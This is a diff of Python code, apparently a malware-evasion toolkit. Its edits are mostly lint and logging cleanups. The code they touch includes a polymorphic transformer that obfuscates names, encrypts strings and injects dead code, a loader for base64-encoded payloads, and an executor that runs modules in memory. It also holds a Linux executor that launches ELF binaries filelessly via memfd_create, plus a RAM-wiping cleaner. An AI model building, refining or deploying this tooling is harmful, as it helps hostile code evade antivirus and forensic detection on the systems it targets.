@@ -134,14 +134,14 @@ class PolymorphicTransformer(ast.NodeTransformer):
         # Third pass: inject dead code if enabled
         if self.inject_dead_code:
             transformed_tree = self._inject_dead_code_blocks(transformed_tree)
-        
+
         # Fix missing locations
         ast.fix_missing_locations(transformed_tree)
-        
+
         try:
             return ast.unparse(transformed_tree)
         except Exception as e:
-            logger.error(f"Failed to unparse transformed AST: {e}")
+            logger.error("Failed to unparse transformed AST: %s", e)
             return code
     
     def _collect_defined_names(self, tree: ast.AST) -> None:
@@ -157,22 +157,22 @@ class PolymorphicTransformer(ast.NodeTransformer):
                 self.defined_names.add(node.id)
             elif isinstance(node, ast.arg):
                 self.defined_names.add(node.arg)
-    
+
     def _generate_obfuscated_name(self) -> str:
         """Generate a random obfuscated variable name"""
         self._name_counter += 1
-        
+
         # Generate a name like _x7a3b2c1_ (underscore prefixed and suffixed)
         random_part = ''.join(random.choices(OBFUSCATION_CHARS, k=8))
         name = f"_{random_part}{self._name_counter}_"
-        
+
         # Ensure it's not a keyword
         while name in PYTHON_KEYWORDS:
             random_part = ''.join(random.choices(OBFUSCATION_CHARS, k=8))
             name = f"_{random_part}{self._name_counter}_"
-        
+
         return name
-    
+
     def _get_obfuscated_name(self, original: str) -> str:
         """Get or create obfuscated name for an original name"""
         if original in PYTHON_KEYWORDS or original in BUILTIN_NAMES:
@@ -186,57 +186,57 @@ class PolymorphicTransformer(ast.NodeTransformer):
         
         return self.name_mapping[original]
     
-    def visit_Name(self, node: ast.Name) -> ast.Name:
+    def visit_Name(self, node: ast.Name) -> ast.Name:  # pylint: disable=invalid-name
         """Transform variable names"""
         if self.obfuscate_names and node.id in self.defined_names:
             node.id = self._get_obfuscated_name(node.id)
         return self.generic_visit(node)
-    
-    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
+
+    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:  # pylint: disable=invalid-name
         """Transform function definitions"""
         # Preserve docstring if configured
-        if (self.preserve_docstrings and 
-            node.body and 
+        if (self.preserve_docstrings and
+            node.body and
             isinstance(node.body[0], ast.Expr) and
             isinstance(node.body[0].value, ast.Constant) and
             isinstance(node.body[0].value.value, str)):
             pass # Docstring logic placeholder
-        
+
         # Obfuscate function name (except main and special methods)
-        if (self.obfuscate_names and 
-            not node.name.startswith("__") and 
+        if (self.obfuscate_names and
+            not node.name.startswith("__") and
             node.name not in ("main", "run")):
             node.name = self._get_obfuscated_name(node.name)
-        
+
         # Obfuscate argument names
         if self.obfuscate_names:
             for arg in node.args.args:
-                if arg.arg != "self" and arg.arg != "cls":
+                if arg.arg not in ("self", "cls"):
                     arg.arg = self._get_obfuscated_name(arg.arg)
-        
+
         # Visit children
         node = self.generic_visit(node)
-        
+
         return node
-    
-    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:
+
+    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:  # pylint: disable=invalid-name
         """Transform class definitions"""
         # Obfuscate class name
         if self.obfuscate_names and not node.name.startswith("_"):
             node.name = self._get_obfuscated_name(node.name)
-        
+
         return self.generic_visit(node)
-    
-    def visit_Constant(self, node: ast.Constant) -> ast.AST:
+
+    def visit_Constant(self, node: ast.Constant) -> ast.AST:  # pylint: disable=invalid-name
         """Transform string constants (encryption)"""
-        if (self.encrypt_strings and 
+        if (self.encrypt_strings and
             isinstance(node.value, str) and
             len(node.value) > 3 and
             not node.value.startswith("__")):
-            
+
             # Skip docstrings (handled separately)
             return self._create_encrypted_string(node.value)
-        
+
         return node
     
     def _create_encrypted_string(self, value: str) -> ast.Call:
@@ -602,7 +602,7 @@ def get_ghost_protocol() -> GhostProtocol:
         GhostProtocol instance
     """
     global _ghost_protocol
-    if "_ghost_protocol" not in globals() or _ghost_protocol is None:
+    if _ghost_protocol is None:
         _ghost_protocol = GhostProtocol()
     return _ghost_protocol
 
@@ -711,32 +711,33 @@ class MemoryOnlyExecutor:
     ) -> Tuple[bool, Any]:
         """
         Create a Python module entirely in memory.
-        
+
         Args:
             module_name: Name for the module
             code: Module source code
-            
+
         Returns:
             Tuple of (success, module_or_error)
         """
         try:
             import types
             import sys
-            
+
             # Create module object
             module = types.ModuleType(module_name)
-            
+
             # Compile and execute in module's namespace
             compiled = compile(code, f"<memory:{module_name}>", "exec")
+            # pylint: disable=exec-used
             exec(compiled, module.__dict__)
-            
+
             # Add to sys.modules (optional - for imports)
             sys.modules[module_name] = module
-            
+
             return True, module
-            
-        except Exception as e:
-            logger.error(f"Memory module creation failed: {e}")
+
+        except Exception as e:  # pylint: disable=broad-except
+            logger.error("Memory module creation failed: %s", e)
             return False, str(e)
     
     def cleanup_namespace(self) -> None:
@@ -1015,30 +1016,29 @@ class LinuxFilelessExecutor:
     ) -> Tuple[bool, str]:
         """
         Execute a binary entirely from memory using memfd_create.
-        
+
         Args:
             binary_data: ELF binary data
             args: Command line arguments
             name: Name for the memfd (appears in /proc)
-            
+
         Returns:
             Tuple of (success, output_or_error)
         """
         if not self._available:
             return False, "memfd_create not available"
-        
+
         try:
             import ctypes
-            import os
             import subprocess
-            
+
             libc = ctypes.CDLL("libc.so.6", use_errno=True)
-            
+
             # Create anonymous memory file
             memfd_create = libc.memfd_create
             memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
             memfd_create.restype = ctypes.c_int
-            
+
             fd = memfd_create(name.encode(), self.MFD_CLOEXEC)
             if fd == -1:
                 return False, "Failed to create memfd"
@@ -1055,7 +1055,8 @@ class LinuxFilelessExecutor:
                 cmd,
                 capture_output=True,
                 text=True,
-                timeout=60
+                timeout=60,
+                check=False
             )
             
             os.close(fd)
@@ -1102,15 +1103,19 @@ def load_encoded_payload(payload: str) -> Tuple[bool, Any]:
     return loader.load_base64_payload(payload)
 
 
+
+# Global singleton
+_fileless_loader = None  # pylint: disable=invalid-name
+
 def get_fileless_loader() -> FilelessLoader:
     """
     Get singleton FilelessLoader instance.
-    
+
     Returns:
         FilelessLoader instance
     """
-    global _fileless_loader
-    if "_fileless_loader" not in globals() or _fileless_loader is None:
+    global _fileless_loader  # pylint: disable=global-statement
+    if _fileless_loader is None:
         _fileless_loader = FilelessLoader()
     return _fileless_loader
 
@@ -1147,18 +1152,18 @@ class RAMCleaner:
         for ba in self._sensitive_refs:
             if id(ba) == ref_id:
                 # Overwrite with zeros
-                for i in range(len(ba)):
+                for i, _ in enumerate(ba):
                     ba[i] = 0
                 # Overwrite with random
-                for i in range(len(ba)):
+                for i, _ in enumerate(ba):
                     ba[i] = random.randint(0, 255)
                 # Final zero pass
-                for i in range(len(ba)):
+                for i, _ in enumerate(ba):
                     ba[i] = 0
-                    
+
                 self._sensitive_refs.remove(ba)
                 del ba
-                logger.debug(f"Wiped sensitive data ref: {ref_id}")
+                logger.debug("Wiped sensitive data ref: %s", ref_id)
                 return True
         return False
         
@@ -1180,13 +1185,13 @@ class RAMCleaner:
         """
         count = 0
         for ba in self._sensitive_refs[:]:
-            for i in range(len(ba)):
+            for i, _ in enumerate(ba):
                 ba[i] = 0
             self._sensitive_refs.remove(ba)
             del ba
             count += 1
-            
-        logger.info(f"Wiped {count} sensitive data items from RAM")
+
+        logger.info("Wiped %d sensitive data items from RAM", count)
         return count
         
     def secure_string(self, data: str) -> 'SecureString':
@@ -1210,7 +1215,7 @@ class SecureString:
     def __del__(self):
         """Securely wipe on garbage collection"""
         if hasattr(self, '_data'):
-            for i in range(len(self._data)):
+            for i, _ in enumerate(self._data):
                 self._data[i] = 0
             del self._data
             
@@ -1222,11 +1227,11 @@ class SecureString:
 
 
 # Singleton
-_ram_cleaner = None
+_ram_cleaner = None  # pylint: disable=invalid-name
 
 def get_ram_cleaner() -> RAMCleaner:
     """Get singleton RAMCleaner instance"""
-    global _ram_cleaner
+    global _ram_cleaner  # pylint: disable=global-statement
     if _ram_cleaner is None:
         _ram_cleaner = RAMCleaner()
     return _ram_cleaner
